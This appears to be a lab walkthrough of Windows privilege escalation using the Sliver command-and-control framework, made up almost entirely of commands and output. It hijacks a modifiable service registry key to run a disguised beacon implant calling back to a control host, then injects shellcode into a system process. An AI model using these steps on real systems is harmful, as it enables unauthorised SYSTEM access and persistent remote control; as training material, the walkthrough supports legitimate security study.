# Sliver

## 01 - Detect

```
sliver (SPATIAL_CLEANER) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon SPATIAL_CLEANER (e5a695e8)

[+] SPATIAL_CLEANER completed task e5a695e8

sliver (SPATIAL_CLEANER) > sharpup audit ModifiableServiceRegistryKeys

[*] Tasked beacon SPATIAL_CLEANER (f04496f7)

[+] SPATIAL_CLEANER completed task f04496f7

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Modifiable Registry Keys ===
        Service 'regsvc' (State: Stopped, StartMode: Manual) : SYSTEM\CurrentControlSet\Services\regsvc



[*] Completed Privesc Checks in 4 seconds

sliver (SPATIAL_CLEANER) > registry list-values -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\"

[*] Tasked beacon SPATIAL_CLEANER (5a7a8ee3)

[+] SPATIAL_CLEANER completed task 5a7a8ee3

[*] Values under HKLM:\SYSTEM\CurrentControlSet\Services\regsvc\:
Type
Start
ErrorControl
ImagePath
DisplayName
ObjectName

sliver (SPATIAL_CLEANER) > registry read -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath"

[*] Tasked beacon SPATIAL_CLEANER (5a8760ce)

[+] SPATIAL_CLEANER completed task 5a8760ce

"C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```

## 02 - Exploit

```
sliver (SPATIAL_CLEANER) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -a x64 -o windows -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/LEGISLATIVE_KICK-OFF.exe

sliver (SPATIAL_CLEANER) > upload LEGISLATIVE_KICK-OFF.exe c:/users/user/documents/registry-query.exe

[*] Tasked beacon SPATIAL_CLEANER (e4bcb2c1)

[+] SPATIAL_CLEANER completed task e4bcb2c1

[*] Wrote file to c:\users\user\documents\registry-query.exe

sliver (SPATIAL_CLEANER) > ls c:/users/user/documents/

[*] Tasked beacon SPATIAL_CLEANER (88077f15)

[+] SPATIAL_CLEANER completed task 88077f15

c:\users\user\documents (5 items, 9.3 MiB)
==========================================
-rw-rw-rw-  desktop.ini                            402 B    Thu Apr 16 23:22:42 -0500 2020
Lrw-rw-rw-  My Music -> C:\Users\user\Music        0 B      Thu Apr 16 23:22:28 -0500 2020
Lrw-rw-rw-  My Pictures -> C:\Users\user\Pictures  0 B      Thu Apr 16 23:22:28 -0500 2020
Lrw-rw-rw-  My Videos -> C:\Users\user\Videos      0 B      Thu Apr 16 23:22:28 -0500 2020
-rw-rw-rw-  registry-query.exe                     9.3 MiB  Thu Nov 17 12:45:54 -0500 2022

sliver (SPATIAL_CLEANER) > registry write -H HKLM -T string "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath" "C:\\users\\user\\documents\\registry-query.exe"

[*] Tasked beacon SPATIAL_CLEANER (c81ed684)

[+] SPATIAL_CLEANER completed task c81ed684

[*] Value written to registry

sliver (SPATIAL_CLEANER) > registry read -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath"

[*] Tasked beacon SPATIAL_CLEANER (ca3b870e)

[+] SPATIAL_CLEANER completed task ca3b870e

C:\users\user\documents\registry-query.exe

sliver (SPATIAL_CLEANER) > execute sc start regsvc

[*] Tasked beacon SPATIAL_CLEANER (76e88a73)

[*] Beacon 74c6ee5f LEGISLATIVE_KICK-OFF - 10.10.221.233:50428 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 13:00:04 EST

sliver (SPATIAL_CLEANER) > kill

⚠  WARNING: This will kill the remote implant process

? Kill the active beacon? Yes
[*] Killed SPATIAL_CLEANER (4e816b78-e0e0-42f8-be16-d9d0a85e92b6)

sliver > use 74c6ee5f-8274-4829-bb19-21f244986b3c

[*] Active beacon LEGISLATIVE_KICK-OFF (74c6ee5f-8274-4829-bb19-21f244986b3c)

sliver (LEGISLATIVE_KICK-OFF) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon LEGISLATIVE_KICK-OFF (1fb04f7a)
```

## 03 - Cleanup

```
sliver (LEGISLATIVE_KICK-OFF) > registry write -H HKLM -T string "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath" "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"

[*] Tasked beacon LEGISLATIVE_KICK-OFF (354a0229)

[+] LEGISLATIVE_KICK-OFF completed task 354a0229

[*] Value written to registry

sliver (LEGISLATIVE_KICK-OFF) > rm C:/users/user/documents/registry-query.exe

[*] Tasked beacon LEGISLATIVE_KICK-OFF (2543c90c)

[+] LEGISLATIVE_KICK-OFF completed task 2543c90c

[!] remove C:\users\user\documents\registry-query.exe: Access is denied.

sliver (LEGISLATIVE_KICK-OFF) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon LEGISLATIVE_KICK-OFF (5767e8bd)

[*] Session 56eb5c8a LEGISLATIVE_KICK-OFF - 10.10.221.233:49259 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:20:22 EST

sliver (LEGISLATIVE_KICK-OFF) > sessions -i 5

[*] Active session LEGISLATIVE_KICK-OFF (56eb5c8a)

sliver (LEGISLATIVE_KICK-OFF) > ps

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]       -1
 4      0                                     x86_64   System                 0
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe               0
 536    528    NT AUTHORITY\SYSTEM            x86_64   csrss.exe              0
 584    528    NT AUTHORITY\SYSTEM            x86_64   wininit.exe            0
 592    576    NT AUTHORITY\SYSTEM            x86_64   csrss.exe              1
 632    576    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe           1
 680    584    NT AUTHORITY\SYSTEM            x86_64   services.exe           0
 688    584    NT AUTHORITY\SYSTEM            x86_64   lsass.exe              0
 700    584    NT AUTHORITY\SYSTEM            x86_64   lsm.exe                0
 788    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 864    680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 936    632    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe            1
 952    680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 996    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 100    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 532    680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1088   680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 1208   680    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe            0
 1248   680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1368   680    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe   0
 1468   680    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe          0
 1496   680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1648   680    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe          0
 1952   680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 1976   680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 1148   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe           0
 2200   2192   NT AUTHORITY\SYSTEM            x86_64   csrss.exe              2
 2224   2192   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe           2
 2380   680    TCM-PC\user                    x86_64   taskhost.exe           2
 2504   1088   TCM-PC\user                    x86_64   rdpclip.exe            2
 2544   996    TCM-PC\user                    x86_64   dwm.exe                2
 2580   2532   TCM-PC\user                    x86_64   explorer.exe           2
 2980   680    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe      0
 2364   680    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe   0
 1784   2580   TCM-PC\user                    x86_64   SPATIAL_CLEANER.exe    2
 1788   680    NT AUTHORITY\SYSTEM            x86      mscorsvw.exe           0
 1848   680    NT AUTHORITY\SYSTEM            x86_64   mscorsvw.exe           0
 1424   680    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe             0
 3044   680    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe           0
 2520   680    NT AUTHORITY\SYSTEM            x86_64   registry-query.exe     0

sliver (LEGISLATIVE_KICK-OFF) > migrate 2364

[!] Error: rpc error: code = Unknown desc = exit status 1

sliver (LEGISLATIVE_KICK-OFF) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/LUCKY_LAYER.bin

sliver (LEGISLATIVE_KICK-OFF) > execute-shellcode -A amd64 -p 1368 LUCKY_LAYER.bin

[*] Executed shellcode on target

[*] Beacon 31ac12a2 LUCKY_LAYER - 10.10.250.121:49366 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:28:36 EST

sliver (LEGISLATIVE_KICK-OFF) > kill

⚠  WARNING: This will kill the remote implant process

? Kill the active session? Yes
[!] Lost session 56eb5c8a LEGISLATIVE_KICK-OFF - 10.10.221.233:49259 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:32:10 EST

[!] Active session disconnected

[*] Killed LEGISLATIVE_KICK-OFF (56eb5c8a-818f-499d-9bb7-d17d1a34d1c5)
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: 74c6ee5f-8274-4829-bb19-21f244986b3c  LEGISLATIVE_KICK-OFF  10.10.221.233:49235  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (74c6ee5f-8274-4829-bb19-21f244986b3c)

sliver > beacons rm

? Select a beacon: 4e816b78-e0e0-42f8-be16-d9d0a85e92b6  SPATIAL_CLEANER  10.10.221.233:49187  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (4e816b78-e0e0-42f8-be16-d9d0a85e92b6)

sliver > use 31ac12a2-c4ff-4c86-b609-c0c9e415a92f

[*] Active beacon LUCKY_LAYER (31ac12a2-c4ff-4c86-b609-c0c9e415a92f)

sliver (LUCKY_LAYER) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon LUCKY_LAYER (bdab3a5e)

sliver (LUCKY_LAYER) > getpid

1368

sliver (LUCKY_LAYER) > rm "C:\users\user\documents\registry-query.exe"

[*] Tasked beacon LUCKY_LAYER (6c2af104)

[+] LUCKY_LAYER completed task 6c2af104

[*] C:\users\user\documents\registry-query.exe
```